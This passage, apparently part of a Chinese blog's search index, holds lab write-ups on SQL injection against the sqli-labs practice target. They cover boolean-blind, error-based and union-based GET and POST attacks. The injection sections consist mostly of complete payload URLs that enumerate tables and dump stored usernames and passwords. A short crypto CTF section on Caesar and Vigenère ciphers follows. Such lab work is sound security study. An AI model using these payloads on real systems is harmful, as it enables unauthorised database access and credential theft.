第2张表的表名的第1个字符为r。 猜测第2张表的表名的第2个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),2,1)=&#x27;e&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),2,1))=101--+ 第2张表的表名的第2个字符为e。 以此类推，得到security库中的第2张表的名字为referers。 依据上述方法，通过不断变换limit和substr()函数中的参数，可以最终得到security库中所有表的表名：emails、referers、uagents和users。其中，第4张表users当中可能存放着网站用户的基本信息。 盲猜users表的全部字段名（1）猜测第1个字段名 猜测第1个字段名的第1个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;i&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=105--+ 第1个字段名的第1个字符为i。 猜测第1个字段名的第2个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),2,1)=&#x27;d&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),2,1))=100--+ 第1个字段名的第2个字符为d。 以此类推，得到users表中的第1个字段名为id。 依据上述方法，通过不断变换limit和substr()函数中的参数，可以最终得到users表中所有字段名：id、username和password。 盲猜users表username和password字段的全部值（1）猜测第1组数据 猜测第1组数据的第1个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),1,1)=&#x27;D&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),1,1))=68--+ 第1组数据的第1个字符为D。 猜测第1组数据的第2个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),2,1)=&#x27;u&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),2,1))=117--+ 第1组数据的第2个字符为u。 以此类推，得到第1组数据为“Dump,Dump”。 注意：字符串中的逗号（,）也是需要进行猜测比对的！例如第1组数据的第5个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),5,1)=&#x27;,&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),5,1))=44--+ 猜测第2组数据 猜测第2组数据的第1个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 1,1),1,1)=&#x27;A&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 1,1),1,1))=65--+ 第2组数据的第1个字符为A。 以此类推，得到第2组数据为“Angelina,I-kill-you”。 依据上述方法，通过不断变换limit和substr()函数中的参数，可以最终得到users表中username和password字段的全部值。实验至此结束。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]},{"title":"SQL注入-基于报错的注入","slug":"SQL注入-基于报错的注入","date":"2025-11-12T15:26:44.516Z","updated":"2025-12-08T09:49:56.708Z","comments":true,"path":"2025/11/12/SQL注入-基于报错的注入/","permalink":"http://example.com/2025/11/12/SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E6%B3%A8%E5%85%A5/","excerpt":"","text":"SQL注入-基于报错的注入1基于字符型注入的基础上 实验原理（1）关于报错注入 基于报错的注入，是指通过构造特定的SQL语句，让攻击者想要查询的信息（如数据库名、版本号、用户名等）通过页面的错误提示回显出来。报错注入一般需要具备两个前提条件：（1）Web应用程序未关闭数据库报错函数，对于一些SQL语句的错误直接回显在页面上；（2）后台未对一些具有报错功能的函数进行过滤。常用的报错功能函数包括extractvalue()、updatexml()、floor()、exp()等。 （2）关于extractvalue()函数 作用：对XML文档进行查询，相当于在HTML文件中用标签查找元素。语法：extractvalue(XML_document, XPath_string)参数1：XML_document是String格式，为XML文档对象的名称；参数2：XPath_string(Xpath格式的字符串)，注入时可操作的地方。报错原理：xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果写入其他格式就会报错，并且会返回写入的非法格式内容，错误信息如：XPATH syntax error:’xxxxxxxx’。 登录后，根据网页提示，先给定一个GET参数，即： 1http://[靶机IP]/sqli-labs/Less-1/?id=1 此时页面显示id&#x3D;1的用户名Dump、密码Dump。 寻找注入点分别使用以下3条payload寻找注入点及判断注入点的类型： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; 运行后报错！ 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;1 运行后正常显示！ 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;2 运行后未正常显示！ 由上述结果可以判断，网站存在字符型注入点。获取网站当前所在数据库的库名使用以下payload获取网站当前所在数据库的库名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,database()))--+ 显示结果为security。 获取数据库security的全部表名使用以下payload获取数据库security的全部表名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))--+ 显示结果中，有一个名为users的表，这当中可能存放着网站用户的基本信息。 注意：extractvalue() 函数所能显示的错误信息最大长度为32，如果错误信息超过了最大长度，有可能导致显示不全。因此，有时需要借助limit来做分行显示，上述payload可以改为： 12345678910http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1)))--+//显示security库中的第1张表的名字http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1)))--+//显示security库中的第2张表的名字http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,1)))--+//显示security库中的第3张表的名字... 获取users表的全部字段名使用以下payload获取users表的全部字段名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)))--+ 显示结果，users表中有id、username和password三个字段。 同上一个步骤相似，为了避免错误信息太长导致显示不全，有时需要借助limit来做分行显示，上述payload可以改为： 12345678910http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1)))--+//显示users表中的第1个字段的名字http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 1,1)))--+//显示users表中的第2个字段的名字http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 2,1)))--+//显示users表中的第3个字段的名字... 获取users表id、username和password字段的全部值。由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如 （1）显示第1组数据 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 0,1)))--+ 显示结果为Dump，Dump。 以此类推，可通过修改limit后面的参数，将users表中存放的所有用户信息全部暴露出来。实验至此结束。 SQL注入-基于报错的注入2基于字符型GET注入 实验原理（1）关于报错注入 基于报错的注入，是指通过构造特定的SQL语句，让攻击者想要查询的信息（如数据库名、版本号、用户名等）通过页面的错误提示回显出来。报错注入一般需要具备两个前提条件：（1）Web应用程序未关闭数据库报错函数，对于一些SQL语句的错误直接回显在页面上；（2）后台未对一些具有报错功能的函数进行过滤。常用的报错功能函数包括extractvalue()、updatexml()、floor()、exp()等。 （2）关于floor()函数 在进行报错注入时，floor()函数一般需要与rand()、count()、group by联用。作用：floor(x)：对参数x向下取整；rand()：生成一个0~1之间的随机浮点数；count(*)：统计某个表下总共有多少条记录；group by x：按照（by）一定的规则（x）进行分组；报错原理：floor()函数与group by、rand()联用时，如果临时表中没有该主键，则在插入前会再计算一次rand()，然后再由group by将计算出来的主键直接插入到临时表格中，导致主键重复报错，错误信息如：Duplicate entry ‘…’ for key ‘group_key’。 寻找注入点分别使用以下3条payload寻找注入点及判断注入点的类型： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; 运行后报错！ 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;1 运行后正常显示！ 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;2 运行后未正常显示！ 由上述结果可以判断，网站存在字符型注入点。 获取网站当前所在数据库的库名使用以下payload获取网站当前所在数据库的库名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示结果为security。注意：请忽略后面的1。 获取数据库security的全部表名使用以下payload获取数据库security的表名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示security库中的第1张表的名字为emails。 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示security库中的第2张表的名字为referers。 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示security库中的第3张表的名字为uagents。 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示security库中的第4张表的名字为users。 以上显示结果中，第4张表users当中可能存放着网站用户的基本信息。 获取users表的全部字段名使用以下payload获取users表的字段名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示users表中的第1个字段名字为id。 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示users表中的第2个字段名字为username。 综合以上显示结果，users表中有id、username和password三个字段。 获取users表id、username和password字段的全部值。由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如 （1）显示第1组数据 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示结果为Dump，Dump。 （2）显示第2组数据 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 显示结果为Angelina，I-kill-you。 以此类推，可通过修改limit后面的参数，将users表中存放的所有用户信息全部暴露出来。实验至此结束。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]},{"title":"SQL注入-基于联合查询的字符型GET注入","slug":"SQL注入-联合查询的POST注入","date":"2025-11-12T14:23:30.148Z","updated":"2025-12-08T09:49:20.231Z","comments":true,"path":"2025/11/12/SQL注入-联合查询的POST注入/","permalink":"http://example.com/2025/11/12/SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%9A%84POST%E6%B3%A8%E5%85%A5/","excerpt":"","text":"SQL注入-基于联合查询的POST注入实验原理POST注入，其注入点存在于POST表单中的参数处。攻击者可以通过代理抓包工具（如Burpsuite）拦截并修改POST表单中的参数，利用union select命令进行注入，暴露数据库中存储的信息。 寻找注入点在POST表单处，分别使用以下2条payload寻找注入点及判断注入点的类型： 1uname=admin&#x27;&amp;passwd=1&amp;submit=Submit 报错！ 1uname=admin&#x27;#&amp;passwd=1&amp;submit=Submit 目标正常回显用户名和密码！ 由此可以判断，目标网站在POST参数处存在字符型注入点。判断网站查询的字段数尝试使用以下payload获取网站查询的字段数（关键字order by）： 1uname=admin&#x27; order by 1#&amp;passwd=1&amp;submit=Submit 目标正常回显用户名和密码！ 1uname=admin&#x27; order by 3#&amp;passwd=1&amp;submit=Submit 报错！ 由此可以判断，网站查询的字段数为2。判断网站的回显位置利用以下payload判断网站的回显位置： 1uname=admin&#x27; and 1=2 union select 1,2#&amp;passwd=1&amp;submit=Submit 运行结果，1号位和2号位均可以回显！ 获取网站当前所在数据库的库名利用以下payload获取网站当前所在数据库的库名： 1uname=admin&#x27; and 1=2 union select 1,database()#&amp;passwd=1&amp;submit=Submit 显示结果为security。 获取数据库security的全部表名使用以下payload获取数据库security的全部表名： 1uname=admin&#x27; and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;#&amp;passwd=1&amp;submit=Submit 显示结果中，有一个名为users的表，这当中可能存放着网站用户的基本信息。 获取users表的全部字段名使用以下payload获取users表的全部字段名： 1uname=admin&#x27; and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;#&amp;passwd=1&amp;submit=Submit 显示结果，users表中有id、username和password三个字段。 获取users表id、username和password字段的全部值。由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如 （1）显示第1组数据 1uname=admin&#x27; and 1=2 union select 1,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 0,1#&amp;passwd=1&amp;submit=Submit 显示结果为Dump，Dump。 以此类推，可通过修改limit后面的参数，将users表中存放的所有用户信息全部暴露出来。实验至此结束。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]},{"title":"SQL注入-基于联合查询的字符型GET注入","slug":"SQL注入-联合查询的GET注入","date":"2025-11-09T12:26:33.023Z","updated":"2025-12-08T09:48:46.443Z","comments":true,"path":"2025/11/09/SQL注入-联合查询的GET注入/","permalink":"http://example.com/2025/11/09/SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%9A%84GET%E6%B3%A8%E5%85%A5/","excerpt":"","text":"web安全综述 nmap+ip只会查找这个ip开放的常见默认的端口，所以把mysql默认的端口3306改成3308之后，再用这个指令去扫描开放的端口的话就会扫描不到 如果加全端口扫描的话就会把修改的mysql的端口就会被扫描到，端口可以扫描到，但是服务却扫描的不是mysql服务 mysql 对大小写不敏感所以大小写皆可 union查询的前后字段数要一样，不然的话就会像上面这样报错 下面这个顾名思义就是用返回的true跟false来确定表名 1select c1,c2,...,cn from result order by M; order by后面的数字（M）必须小于或等于n（数据库查询的字段数），才能正常显示。如果M&gt;n，数据库就会报错。可以利用这个特点判断数据库查询的字段数。 2．limit的用法基本格式为： 12345limit M,N//表示从第M+1条数据开始，顺序往下查询N条数据limit M//表示查询前M条数据 1select c1,c2,...,cn from result union select d1,d2,...dm; 后半句union select查询的字段数（m）必须与前半句select查询的字段数（n）相等，数据库才能正常显示结果。与order by相似，可以利用这个特点判断数据库查询的字段数。 1select id,city from result where id=1 and 1=2 union select name,score from result; 从以上结果可以总结，在已知字段名的情况下，攻击者只要将该字段置于任何能够显示的位置，就可以暴露该字段的值。 MySQL（MariaDB）5.5以上版本自带information_schema数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息，如数据库名、数据库的表、表栏的数据类型与访问权限等。可以把information_schema数据库看作MySQL（MariaDB）的“目录”！ 123show databases;select schema_name from information_schema.schemata; 两条语句执行结果相同！ 第一组： 123use student;show tables; 第二组： 1select table_name from information_schema.tables where table_schema=&#x27;student&#x27;; 两条语句执行结果相同！ SQL注入-基于联合查询的数字型GET注入实验原理数字型GET注入，其注入点存在于URL中的GET参数处，如http://www.testweb.com/user.php?id=8，而服务器后端实际查询代码原型诸如：“select … from … where id&#x3D;$id…” 。攻击者可以通过构造恶意的GET输入参数，利用union select命令进行注入，暴露数据库中存储的信息 寻找注入点分别使用以下3条payload寻找注入点及判断注入点的类型： 1http://[靶机IP]/sqli-labs/Less-2/?id=1&#x27; 运行后报错！ 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=1 运行后正常显示！ 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 运行后未正常显示！ 由上述结果可以判断，网站存在数字型注入点。 判断网站查询的字段数尝试使用以下payload获取网站查询的字段数（关键字order by）： 1http://[靶机IP]/sqli-labs/Less-2/?id=1 order by 1--+ 正常显示！ 判断网站查询的字段数 尝试使用以下payload获取网站查询的字段数（关键字order by）： 1http://[靶机IP]/sqli-labs/Less-2/?id=1 order by 2--+ 正常显示！ 判断网站查询的字段数 尝试使用以下payload获取网站查询的字段数（关键字order by）： 1http://[靶机IP]/sqli-labs/Less-2/?id=1 order by 3--+ 正常显示！ 判断网站查询的字段数 尝试使用以下payload获取网站查询的字段数（关键字order by）： 1http://[靶机IP]/sqli-labs/Less-2/?id=1 order by 4--+ 报错！ 由上述结果可以判断，网站查询的字段数为3。 判断网站的回显位置利用以下payload判断网站的回显位置： 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,3--+ 执行的结果是：2号位和3号位可以回显！ 后面的步骤中，我们可以在2号位或3号位设置一些具有特殊功能的函数或命令来执行SQL注入！ 获取网站当前所在数据库的库名使用以下payload获取网站当前所在数据库的库名： 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,database()--+ 显示结果为security。 获取数据库security的全部表名使用以下payload获取数据库security的全部表名： 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+ 显示结果中，有一个名为users的表，这当中可能存放着网站用户的基本信息。 获取users表的全部字段名使用以下payload获取users表的全部字段名： 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+ 显示结果，users表中有id、username和password三个字段。 获取users表id、username和password字段的全部值。由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如 （1）显示第1组数据 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 0,1--+ 显示结果为Dump，Dump。 （2）显示第2组数据 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 1,1--+ 显示结果为Angelina，I-kill-you。 以此类推，可通过修改limit后面的参数，将users表中存放的所有用户信息全部暴露出来。 SQL注入-基于联合查询的字符型GET注入实验原理字符型GET注入，其注入点存在于URL中的GET参数处，如http://www.testweb.com/user.php?id=admin，而服务器后端实际查询代码原型诸如：“select … from … where id&#x3D;’$id’…” 。攻击者可以通过构造恶意的GET输入参数，利用union select命令进行注入，暴露数据库中存储的信息。 寻找注入点分别使用以下3条payload寻找注入点及判断注入点的类型： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; 运行后报错！ 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;1 运行后正常显示！ 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;2 运行后未正常显示！ 由上述结果可以判断，网站存在字符型注入点。 判断网站查询的字段数尝试使用以下payload获取网站查询的字段数（关键字order by）： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; order by 1--+ 正常显示！ 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; order by 4--+ 报错！ 由上述结果可以判断，网站查询的字段数为3。 判断网站的回显位置利用以下payload判断网站的回显位置： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,3--+ 执行的结果是：2号位和3号位可以回显！ 获取网站当前所在数据库的库名使用以下payload获取网站当前所在数据库的库名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,database()--+ 显示结果为security。 获取数据库security的全部表名使用以下payload获取数据库security的全部表名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+ 显示结果中，有一个名为users的表，这当中可能存放着网站用户的基本信息。 获取users表的全部字段名使用以下payload获取users表的全部字段名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+ 显示结果，users表中有id、username和password三个字段。 获取users表id、username和password字段的全部值。由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如 （1）显示第1组数据 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 0,1--+ 显示结果为Dump，Dump。 （2）显示第2组数据 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 1,1--+ 显示结果为Angelina，I-kill-you。 以此类推，可通过修改limit后面的参数，将users表中存放的所有用户信息全部暴露出来。实验至此结束。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]},{"title":"Crypto","slug":"Crypto","date":"2025-10-20T11:47:30.726Z","updated":"2025-10-25T08:06:10.923Z","comments":true,"path":"2025/10/20/Crypto/","permalink":"http://example.com/2025/10/20/Crypto/","excerpt":"","text":"一、古典密码1.凯撒密码[SWPUCTF 2021 新生赛]ez_caesar1234567891011121314151617181920附件.pyimport base64def caesar(plaintext): #定义凯撒密码加密函数，参数为明文 str_list = list(plaintext) i = 0 while i &lt; len(plaintext): if not str_list[i].isalpha(): #如果当前字符不是字母，保持不变。 str_list[i] = str_list[i] else: a = &quot;A&quot; if str_list[i].isupper() else &quot;a&quot; #如果是字母，就会判断是大写还是小写 str_list[i] = chr((ord(str_list[i]) - ord(a) + 5) % 26 + ord(a) or 5) #将字符转换为0-25的数字，向右偏移5位（凯撒移位） i = i + 1 return &#x27;&#x27;.join(str_list)flag = &quot;*************************&quot;str = caesar(flag)print(str)#str=&quot;U1hYSFlLe2R0em1mYWpwc3RiaGZqeGZ3fQ==&quot; base64的特征1.字符集固定：仅由 A-Z、a-z、0-9、+、/ 这64个字符组成，通常末尾用 = 作为填充。 2.长度规律：编码后的字符串长度总是4的倍数（不足时用 = 填充）。 凯撒(caesar)的特征 1.字符平移：所有字母在字母表中整体、固定地偏移一个位置。 2.字母集不变：密文仅由字母组成，且保持原始的大小写。 3.词形保留：单词的长度和结构与明文完全相同。 例如：偏移3位时：ABC → DEF，hello → khoor 通过观察文本是否仍像有意义的单词或短语，但所有字母都被系统地“替换”成了字母表中的另一个字母，来快速判断它是否可能是凯撒密码，如果是凯撒密码的话就要找到它的偏移量。 解密思路就是先base64解码再凯撒解码 解法一：在线解密网站1https://ctf.bugku.com/tools#:~:text=Bugku%20CTF%E5%9C%A8 1SXXHYK&#123;dtzmfajpstbhfjxfw&#125; 1NSSCTF&#123;youhaveknowcaesar&#125; 如果它的偏移量很小的话就可以通过网站的枚举来解密找到flag 解法二：工具—[随波逐流]CTF编码工具 2.维吉尼亚密码特征1.周期性多表替换：使用一个重复的密钥词进行加密，导致相同的明文字母在不同位置会被加密成不同的密文字母。 2.打破频率分布：密文中字母的频率分布比单表替换密码（如凯撒）平坦得多，更接近随机分布。 3.密钥是关键：加密强度完全依赖于密钥的保密性和长度。 你通过观察密文，发现同一个明文字母（如高频字母E）在密文中对应多个不同字母，但这种替换呈现出一定的周期性规律，来识别维吉尼亚密码，而维吉尼亚密码关键就是要确定其秘钥key是什么 [SWPUCTF 2021 新生赛]crypto9123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384附件.txt-&gt;.pyAKKPLX&#123;qv5x0021-7n8w-wr05-x25w-7882ntu5q984&#125; #密文脚本给你了，去解吧letter_list = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27; # 字母表# 根据输入的key生成key列表def Get_KeyList(key): key_list = [] for ch in key: key_list.append(ord(ch.upper()) - 65) # A=0, B=1, ..., Z=25 return key_list #key_list = [13,18,18]# 加密函数,加密公式：C = (P + K) mod 26,只对字母进行加密，非字母字符原样保留,持原文的大小写格式def Encrypt(plaintext, key_list): ciphertext = &quot;&quot; i = 0 for ch in plaintext: # 遍历明文 if 0 == i % len(key_list): i = 0 if ch.isalpha(): # 明文是否为字母,如果是,则判断大小写,分别进行加密 if ch.isupper(): ciphertext += letter_list[(ord(ch) - 65 + key_list[i]) % 26] #注意前面的AKKPLX和NSSCTF的对应关系：N-&gt;（78 - 65 +13 ）%26-&gt; A，所以N先转为ASCII数字78，而这里的65是指ASCII 65大写字母A，这里78减去65之后就是P=13,而key_list[i]就是K在上面的代码里面就已经经过ASCII计算好了为13，这里模26之后就是0,0对应字母A，因为26字母表是从0开始到25编号，这样第一个加密字符就完成了,其他的加密字符以此类推，而C-&gt;（67 - 65 +13）%26-&gt; P，而P的字母表的位置编号就是15,所以秘钥key就是NSS一个循环，如果不确定可以都推出来看看是不是NSS一个循环 i += 1 else: ciphertext += letter_list[(ord(ch) - 97 + key_list[i]) % 26].lower() #小写 i += 1 else: # 如果密文不为字母,直接添加到密文字符串里 ciphertext += ch return ciphertext# 解密函数,解密公式：P = (C - K) mod 26def Decrypt(ciphertext, key): plaintext = &quot;&quot; i = 0 for ch in ciphertext: # 遍历密文 if 0 == i % len(key_list): i = 0 if ch.isalpha(): # 密文为否为字母,如果是,则判断大小写,分别进行解密 if ch.isupper(): plaintext += letter_list[(ord(ch) - 65 - key_list[i]) % 26] i += 1 else: plaintext += letter_list[(ord(ch) - 97 - key_list[i]) % 26].lower() i += 1 else: # 如果密文不为字母,直接添加到明文字符串里 plaintext += ch return plaintextif __name__ == &#x27;__main__&#x27;: print(&quot;加密请按D,解密请按E:&quot;) user_input = input(); while (user_input != &#x27;D&#x27; and user_input != &#x27;E&#x27;): # 输入合法性判断 print(&quot;输入有误!请重新输入:&quot;) user_input = input() print(&quot;请输入密钥:&quot;) key = input() while (False == key.isalpha()): # 输入合法性判断 print(&quot;输入有误!密钥为字母,请重新输入:&quot;) key = input() key_list = Get_KeyList(key) if user_input == &#x27;D&#x27;: # 加密 print(&quot;请输入明文:&quot;) plaintext = input() ciphertext = Encrypt(plaintext, key_list) print(&quot;密文为:\\n%s&quot; % ciphertext) else: # 解密 print(&quot;请输入密文:&quot;) ciphertext = input() plaintext = Decrypt(ciphertext, key_list) print(&quot;明文为:\\n%s&quot; % plaintext) 法一：直接使用题目提供的脚本 一个交互式的脚本 1NSSCTF&#123;dd5f0021-7a8e-ee05-f25e-7882abc5d984&#125; P，C 和 K 的含义 P（Plaintext Number）含义：明文字母对应的数字，取值范围：0-25 转换规则： A &#x3D; 0, B &#x3D; 1, C &#x3D; 2, …, Z &#x3D; 25 不区分大小写：’a’ 和 